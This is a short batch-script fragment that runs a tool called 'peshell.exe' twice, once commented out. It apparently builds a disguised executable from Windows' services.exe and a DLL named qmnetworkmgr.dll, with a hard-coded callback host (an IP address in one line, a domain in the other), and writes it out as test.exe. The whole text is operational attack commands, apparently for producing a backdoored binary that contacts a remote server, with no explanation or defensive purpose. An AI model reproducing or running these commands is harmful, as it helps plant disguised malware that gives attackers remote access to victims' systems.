...
peshell.exe -b services.exe qmnetworkmgr.dll -p 154.84.63.152 mytest -o test.exe
rem peshell.exe -b services.exe qmnetworkmgr.dll -p zozotown2304.ufcfan.org mytest -o test.exe
